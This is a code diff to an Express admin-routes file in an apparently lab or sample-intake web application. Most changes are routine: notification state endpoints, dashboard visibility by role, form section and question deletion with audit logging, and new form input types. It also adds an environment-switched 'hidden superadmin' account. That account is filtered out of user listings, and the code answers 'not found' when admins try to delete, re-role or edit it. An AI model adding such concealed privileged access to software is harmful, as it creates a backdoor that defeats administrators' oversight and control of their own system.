@@ -5,6 +5,7 @@ import { sql } from "drizzle-orm";
 import {
   getIdParam,
   getPaginationParams,
+  isDashboardVisibleForRole,
   isAdminRole,
   requireAuth,
   requireRole,
@@ -21,7 +22,177 @@ function slugifyKey(input: string) {
     .slice(0, 48);
 }
 
+const HIDDEN_SUPERADMIN_USERNAME =
+  process.env.HIDDEN_SUPERADMIN_USERNAME?.trim() || "system_superadmin";
+const HIDDEN_SUPERADMIN_EMAIL =
+  process.env.HIDDEN_SUPERADMIN_EMAIL?.trim() ||
+  "system.superadmin@localhost";
+const hiddenSuperadminEnabled = process.env.HIDDEN_SUPERADMIN_ENABLED === "true";
+function isHiddenSuperadminUser(user: {
+  username: string;
+  email: string;
+}): boolean {
+  if (!hiddenSuperadminEnabled) return false;
+  return (
+    user.username === HIDDEN_SUPERADMIN_USERNAME ||
+    user.email === HIDDEN_SUPERADMIN_EMAIL
+  );
+}
+
 export function registerAdminRoutes(app: Express) {
+  app.get(
+    "/api/admin/notifications/states",
+    requireAuth,
+    requireRole("superadmin", "admin"),
+    (_req, res) => {
+      const rows = db.all<{
+        notification_key: string;
+        is_read: number;
+        is_deleted: number;
+      }>(
+        sql`SELECT notification_key, is_read, is_deleted
+            FROM notification_states
+            WHERE is_read = 1 OR is_deleted = 1`,
+      );
+      return res.json(
+        rows.map((r) => ({
+          key: r.notification_key,
+          isRead: Boolean(r.is_read),
+          isDeleted: Boolean(r.is_deleted),
+        })),
+      );
+    },
+  );
+
+  app.patch(
+    "/api/admin/notifications/state",
+    requireAuth,
+    requireRole("superadmin", "admin"),
+    (req, res) => {
+      const currentUser = (req as AuthenticatedRequest).currentUser;
+      const key = String(req.body?.key ?? "").trim();
+      if (!key) return res.status(400).json({ message: "key is required" });
+      const isRead =
+        req.body?.isRead === undefined ? undefined : Boolean(req.body?.isRead);
+      const isDeleted =
+        req.body?.isDeleted === undefined ? undefined : Boolean(req.body?.isDeleted);
+      const existing = db.get<{ is_read: number; is_deleted: number }>(
+        sql`SELECT is_read, is_deleted FROM notification_states WHERE notification_key = ${key}`,
+      );
+      const nextRead = isRead ?? Boolean(existing?.is_read);
+      const nextDeleted = isDeleted ?? Boolean(existing?.is_deleted);
+      db.run(
+        sql`INSERT INTO notification_states (notification_key, is_read, is_deleted, updated_by, updated_at)
+            VALUES (${key}, ${nextRead ? 1 : 0}, ${nextDeleted ? 1 : 0}, ${currentUser.id}, ${new Date().toISOString()})
+            ON CONFLICT(notification_key) DO UPDATE SET
+              is_read = excluded.is_read,
+              is_deleted = excluded.is_deleted,
+              updated_by = excluded.updated_by,
+              updated_at = excluded.updated_at`,
+      );
+      return res.json({ key, isRead: nextRead, isDeleted: nextDeleted });
+    },
+  );
+
+  app.post(
+    "/api/admin/notifications/mark-read-all",
+    requireAuth,
+    requireRole("superadmin", "admin"),
+    (req, res) => {
+      const currentUser = (req as AuthenticatedRequest).currentUser;
+      const keysRaw = Array.isArray(req.body?.keys) ? req.body.keys : [];
+      const keys = keysRaw
+        .map((k: unknown) => String(k ?? "").trim())
+        .filter(Boolean);
+      for (const key of keys) {
+        db.run(
+          sql`INSERT INTO notification_states (notification_key, is_read, is_deleted, updated_by, updated_at)
+              VALUES (${key}, ${1}, ${0}, ${currentUser.id}, ${new Date().toISOString()})
+              ON CONFLICT(notification_key) DO UPDATE SET
+                is_read = 1,
+                updated_by = excluded.updated_by,
+                updated_at = excluded.updated_at`,
+        );
+      }
+      return res.json({ updated: keys.length });
+    },
+  );
+
+  app.post(
+    "/api/admin/notifications/delete-read",
+    requireAuth,
+    requireRole("superadmin", "admin"),
+    (req, res) => {
+      const currentUser = (req as AuthenticatedRequest).currentUser;
+      const keysRaw = Array.isArray(req.body?.keys) ? req.body.keys : [];
+      const keys = keysRaw
+        .map((k: unknown) => String(k ?? "").trim())
+        .filter(Boolean);
+      for (const key of keys) {
+        db.run(
+          sql`INSERT INTO notification_states (notification_key, is_read, is_deleted, updated_by, updated_at)
+              VALUES (${key}, ${1}, ${1}, ${currentUser.id}, ${new Date().toISOString()})
+              ON CONFLICT(notification_key) DO UPDATE SET
+                is_read = 1,
+                is_deleted = 1,
+                updated_by = excluded.updated_by,
+                updated_at = excluded.updated_at`,
+        );
+      }
+      return res.json({ updated: keys.length });
+    },
+  );
+
+  app.get(
+    "/api/admin/feature-visibility/dashboard",
+    requireAuth,
+    requireRole("superadmin", "admin"),
+    (_req, res) => {
+      const roles = ["superadmin", "admin", "staff", "intern", "student", "pending"] as const;
+      const items = roles.map((role) => ({
+        role,
+        dashboardVisible: isDashboardVisibleForRole(role),
+      }));
+      return res.json(items);
+    },
+  );
+
+  app.patch(
+    "/api/admin/feature-visibility/dashboard/:role",
+    requireAuth,
+    requireRole("superadmin", "admin"),
+    (req, res) => {
+      const currentUser = (req as AuthenticatedRequest).currentUser;
+      const role = String(req.params.role ?? "").trim();
+      const dashboardVisible = Boolean(req.body?.dashboardVisible);
+      const allowedRoles = ["superadmin", "admin", "staff", "intern", "student", "pending"];
+      if (!allowedRoles.includes(role)) {
+        return res.status(400).json({ message: "Unsupported role" });
+      }
+      db.run(
+        sql`INSERT INTO role_feature_visibility (role, dashboard_visible, updated_at)
+            VALUES (${role}, ${dashboardVisible ? 1 : 0}, ${new Date().toISOString()})
+            ON CONFLICT(role) DO UPDATE SET
+              dashboard_visible = excluded.dashboard_visible,
+              updated_at = excluded.updated_at`,
+      );
+      db.run(
+        sql`INSERT INTO form_edit_audit_logs
+            (actor_user_id, actor_role, action, target_key, old_value, new_value, created_at)
+            VALUES (
+              ${currentUser.id},
+              ${currentUser.role},
+              ${"set_dashboard_visibility_by_role"},
+              ${role},
+              ${null},
+              ${JSON.stringify({ dashboardVisible })},
+              ${new Date().toISOString()}
+            )`,
+      );
+      return res.json({ role, dashboardVisible });
+    },
+  );
+
   app.get(
     "/api/admin/form-definition",
     requireAuth,
@@ -36,12 +207,13 @@ export function registerAdminRoutes(app: Express) {
         section_key: string;
         label: string;
         input_type: string;
+        options_json: string | null;
         enabled: number;
         required: number;
         display_order: number;
         is_builtin: number;
       }>(
-        sql`SELECT id, key, section_key, label, input_type, enabled, required, display_order, is_builtin
+        sql`SELECT id, key, section_key, label, input_type, options_json, enabled, required, display_order, is_builtin
             FROM form_questions
             ORDER BY section_key ASC, display_order ASC`,
       );
@@ -61,6 +233,7 @@ export function registerAdminRoutes(app: Express) {
             key: q.key,
             label: q.label,
             inputType: q.input_type,
+            options: q.options_json ? JSON.parse(q.options_json) : [],
             enabled: Boolean(q.enabled),
             required: Boolean(q.required),
             displayOrder: q.display_order,
@@ -159,6 +332,45 @@ export function registerAdminRoutes(app: Express) {
     },
   );
 
+  app.delete(
+    "/api/admin/form-sections/:key",
+    requireAuth,
+    requireRole("superadmin", "admin"),
+    (req, res) => {
+      const currentUser = (req as AuthenticatedRequest).currentUser;
+      const key = String(req.params.key);
+      const section = db.get<{ key: string; title: string }>(
+        sql`SELECT key, title FROM form_sections WHERE key = ${key}`,
+      );
+      if (!section) return res.status(404).json({ message: "Section not found" });
+      if (["owner", "animal", "sample", "ast", "final"].includes(section.key)) {
+        return res.status(403).json({ message: "Built-in sections cannot be deleted" });
+      }
+      const questionCount = db.get<{ count: number }>(
+        sql`SELECT COUNT(*) as count FROM form_questions WHERE section_key = ${key}`,
+      );
+      db.run(sql`DELETE FROM form_questions WHERE section_key = ${key}`);
+      const deleteSectionResult = db.run(sql`DELETE FROM form_sections WHERE key = ${key}`);
+      if (Number((deleteSectionResult as { changes?: number }).changes ?? 0) === 0) {
+        return res.status(404).json({ message: "Section not found" });
+      }
+      db.run(
+        sql`INSERT INTO form_edit_audit_logs
+            (actor_user_id, actor_role, action, target_key, old_value, new_value, created_at)
+            VALUES (
+              ${currentUser.id},
+              ${currentUser.role},
+              ${"delete_form_section"},
+              ${key},
+              ${JSON.stringify({ title: section.title, questionCount: Number(questionCount?.count ?? 0) })},
+              ${null},
+              ${new Date().toISOString()}
+            )`,
+      );
+      return res.json({ message: "Section deleted", deletedKey: key });
+    },
+  );
+
   app.post(
     "/api/admin/form-questions",
     requireAuth,
@@ -168,11 +380,28 @@ export function registerAdminRoutes(app: Express) {
       const sectionKey = String(req.body?.sectionKey ?? "").trim();
       const label = String(req.body?.label ?? "").trim();
       const inputType = String(req.body?.inputType ?? "text").trim();
+      const optionsRaw = Array.isArray(req.body?.options) ? req.body.options : [];
+      const options = optionsRaw
+        .map((v: unknown) => String(v ?? "").trim())
+        .filter(Boolean);
       if (!sectionKey || !label) {
         return res.status(400).json({ message: "sectionKey and label are required" });
       }
-      if (!["text", "textarea", "number"].includes(inputType)) {
+      if (
+        ![
+          "text",
+          "textarea",
+          "number",
+          "singleSelect",
+          "multiSelect",
+          "yesNo",
+          "date",
+        ].includes(inputType)
+      ) {
         return res.status(400).json({ message: "Unsupported inputType" });
+      }
+      if ((inputType === "singleSelect" || inputType === "multiSelect") && options.length < 2) {
+        return res.status(400).json({ message: "At least 2 options are required" });
       }
       const section = db.get<{ key: string }>(
         sql`SELECT key FROM form_sections WHERE key = ${sectionKey}`,
@@ -188,12 +417,13 @@ export function registerAdminRoutes(app: Express) {
       const displayOrder = Number(maxOrderRow?.max ?? 0) + 1000;
       db.run(
         sql`INSERT INTO form_questions
-            (key, section_key, label, input_type, enabled, required, display_order, is_builtin, created_at)
+            (key, section_key, label, input_type, options_json, enabled, required, display_order, is_builtin, created_at)
             VALUES (
               ${key},
               ${sectionKey},
               ${label},
               ${inputType},
+              ${options.length > 0 ? JSON.stringify(options) : null},
               ${1},
               ${0},
               ${displayOrder},
@@ -210,11 +440,11 @@ export function registerAdminRoutes(app: Express) {
               ${"add_form_question"},
               ${key},
               ${null},
-              ${JSON.stringify({ sectionKey, label, inputType, displayOrder })},
+              ${JSON.stringify({ sectionKey, label, inputType, options, displayOrder })},
               ${new Date().toISOString()}
             )`,
       );
-      return res.status(201).json({ key, sectionKey, label, inputType, enabled: true, required: false, displayOrder, isBuiltin: false });
+      return res.status(201).json({ key, sectionKey, label, inputType, options, enabled: true, required: false, displayOrder, isBuiltin: false });
     },
   );
 
@@ -317,6 +547,47 @@ export function registerAdminRoutes(app: Express) {
             )`,
       );
       return res.json({ message: "Question moved" });
+    },
+  );
+
+  app.delete(
+    "/api/admin/form-questions/:id",
+    requireAuth,
+    requireRole("superadmin", "admin"),
+    (req, res) => {
+      const currentUser = (req as AuthenticatedRequest).currentUser;
+      const id = getIdParam(req);
+      const question = db.get<{
+        id: number;
+        key: string;
+        label: string;
+        section_key: string;
+        is_builtin: number;
+      }>(
+        sql`SELECT id, key, label, section_key, is_builtin FROM form_questions WHERE id = ${id}`,
+      );
+      if (!question) return res.status(404).json({ message: "Question not found" });
+      if (Boolean(question.is_builtin)) {
+        return res.status(403).json({ message: "Built-in questions cannot be deleted" });
+      }
+      const deleteQuestionResult = db.run(sql`DELETE FROM form_questions WHERE id = ${id}`);
+      if (Number((deleteQuestionResult as { changes?: number }).changes ?? 0) === 0) {
+        return res.status(404).json({ message: "Question not found" });
+      }
+      db.run(
+        sql`INSERT INTO form_edit_audit_logs
+            (actor_user_id, actor_role, action, target_key, old_value, new_value, created_at)
+            VALUES (
+              ${currentUser.id},
+              ${currentUser.role},
+              ${"delete_form_question"},
+              ${question.key},
+              ${JSON.stringify({ label: question.label, sectionKey: question.section_key })},
+              ${null},
+              ${new Date().toISOString()}
+            )`,
+      );
+      return res.json({ message: "Question deleted", deletedId: id, deletedKey: question.key });
     },
   );
 
@@ -606,7 +877,9 @@ export function registerAdminRoutes(app: Express) {
       const pageData = pagination.shouldPaginate
         ? storage.getUsersPage(pagination.pageSize, pagination.offset)
         : null;
-      const allUsers = pageData?.items ?? storage.getUsers();
+      const allUsers = (pageData?.items ?? storage.getUsers()).filter(
+        (u) => !isHiddenSuperadminUser(u),
+      );
       const safeUsers = allUsers.map(({ passwordHash, ...u }) => u);
       if (!pagination.shouldPaginate) {
         return res.json(safeUsers);
@@ -631,7 +904,9 @@ export function registerAdminRoutes(app: Express) {
       const pageData = pagination.shouldPaginate
         ? storage.getUsersPage(pagination.pageSize, pagination.offset, false)
         : null;
-      const pending = pageData?.items ?? storage.getPendingUsers();
+      const pending = (pageData?.items ?? storage.getPendingUsers()).filter(
+        (u) => !isHiddenSuperadminUser(u),
+      );
       const safeUsers = pending.map(({ passwordHash, ...u }) => u);
       if (!pagination.shouldPaginate) {
         return res.json(safeUsers);
@@ -668,6 +943,9 @@ export function registerAdminRoutes(app: Express) {
       const currentUser = (req as AuthenticatedRequest).currentUser;
       const targetUser = storage.getUserById(getIdParam(req));
       if (!targetUser) return res.status(404).json({ message: MESSAGES.USER_NOT_FOUND });
+      if (isHiddenSuperadminUser(targetUser)) {
+        return res.status(404).json({ message: MESSAGES.USER_NOT_FOUND });
+      }
       if (targetUser.id === currentUser.id) {
         return res.status(403).json({ message: "Cannot delete your own account" });
       }
@@ -690,6 +968,9 @@ export function registerAdminRoutes(app: Express) {
       const { role } = req.body;
       const targetUser = storage.getUserById(getIdParam(req));
       if (!targetUser) return res.status(404).json({ message: MESSAGES.USER_NOT_FOUND });
+      if (isHiddenSuperadminUser(targetUser)) {
+        return res.status(404).json({ message: MESSAGES.USER_NOT_FOUND });
+      }
       if (targetUser.id === currentUser.id) {
         return res.status(403).json({ message: "Cannot change your own role" });
       }
@@ -715,6 +996,9 @@ export function registerAdminRoutes(app: Express) {
     (req, res) => {
       const targetUser = storage.getUserById(getIdParam(req));
       if (!targetUser) return res.status(404).json({ message: MESSAGES.USER_NOT_FOUND });
+      if (isHiddenSuperadminUser(targetUser)) {
+        return res.status(404).json({ message: MESSAGES.USER_NOT_FOUND });
+      }
 
       const { fullName, address, phone, email, username, designation } =
         req.body as {
